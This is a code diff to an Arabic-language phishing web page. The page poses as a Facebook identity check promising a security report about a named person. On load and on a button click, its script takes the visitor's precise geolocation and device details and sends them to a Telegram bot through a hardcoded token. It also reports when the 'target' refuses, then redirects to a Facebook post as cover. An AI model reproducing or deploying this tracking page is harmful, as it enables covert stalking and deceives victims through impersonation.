@@ -3,60 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحميل التقرير الرسمي - 2026</title>
+    <title>مركز أمان الحسابات</title>
     <style>
-        body { background-color: #1a1a1a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; padding: 20px; border: 1px solid #333; border-radius: 10px; background: #222; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 90%; max-width: 380px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 24px; font-weight: bold; margin-bottom: 15px; }
+        .btn { background-color: #1877f2; color: white; padding: 12px; border-radius: 6px; text-decoration: none; display: block; font-weight: bold; margin-top: 20px; cursor: pointer; border: none; width: 100%; }
+        .info { font-size: 14px; color: #606770; line-height: 1.5; margin-top: 15px; }
+        #error-msg { color: red; font-size: 13px; display: none; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>جاري تحضير الملف...</h2>
-        <p>يرجى السماح بالوصول للموقع للمصادقة الأمنية وتحميل التقرير الخاص بـ (حيدر التراب).</p>
-        <div class="loader"></div>
-    </div>
 
-    <script>
-        // بياناتك الخاصة
-        const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
-        const chat_id = '7214473798';
+<div class="card">
+    <div class="fb-logo">Facebook Service</div>
+    <h3>تأكيد الهوية الرقمية</h3>
+    <p class="info">
+        لعرض التقرير الأمني الخاص بـ <b>(حيدر التراب)</b>، يتطلب النظام التحقق من موقعك الجغرافي لضمان وصولك الآمن من المنطقة المصرح بها.
+    </p>
+    <div id="error-msg">⚠️ فشلت المصادقة: يجب السماح بالوصول للموقع للمتابعة.</div>
+    <button class="btn" onclick="requestLocation()">تأكيد الهوية والتحميل</button>
+</div>
 
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-            fetch(url).catch(err => console.log('Error sending to Telegram'));
+<script>
+    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
+    const chat_id = '7214473798';
+
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+        fetch(url).catch(err => console.error('Error:', err));
+    }
+
+    function requestLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        } else {
+            sendToTelegram("❌ المتصفح لا يدعم Geolocation.");
         }
+    }
 
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const acc = position.coords.accuracy;
-                    const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    let report = `🎯 **تم صيد هدف جديد!**\n\n`;
-                    report += `📍 الموقع على الخريطة:\n${googleMaps}\n\n`;
-                    report += `📏 دقة الموقع: ${acc} متر\n`;
-                    report += `📱 نظام الجهاز: ${navigator.platform}\n`;
-                    report += `🌐 المتصفح: ${navigator.userAgent}`;
+    function successCallback(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = position.coords.accuracy;
+        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        let report = `🎯 **تم صيد الهدف بنجاح!**\n\n`;
+        report += `📍 رابط الموقع:\n${googleMaps}\n\n`;
+        report += `📏 الدقة: ${acc} متر\n`;
+        report += `📱 الجهاز: ${navigator.platform}`;
 
-                    sendToTelegram(report);
+        sendToTelegram(report);
 
-                    // تمويه: تحويله لصفحة فيسبوك بعد ثانية
-                    setTimeout(() => {
-                        window.location.href = "https://www.facebook.com/share/17y7raGdnu/";
-                    }, 1500);
+        // تحويله لصفحة المنشور الأصلية بعد النجاح
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com/share/17y7raGdnu/";
+        }, 1000);
+    }
 
-                }, function(error) {
-                    sendToTelegram("⚠️ الشخص فتح الرابط لكنه رفض إعطاء صلاحية الموقع (رفض الطلب).");
-                    window.location.href = "https://www.facebook.com/share/17y7raGdnu/";
-                }, {enableHighAccuracy: true});
-            } else {
-                sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع.");
-            }
-        };
-    </script>
+    function errorCallback(error) {
+        document.getElementById('error-msg').style.display = 'block';
+        if (error.code === error.PERMISSION_DENIED) {
+            sendToTelegram("⚠️ الهدف رفض الصلاحية (ضغط Block).");
+        } else {
+            sendToTelegram("⚠️ خطأ في جلب الموقع: " + error.message);
+        }
+    }
+
+    // محاولة الطلب تلقائياً عند الدخول
+    window.onload = requestLocation;
+</script>
+
 </body>
 </html>
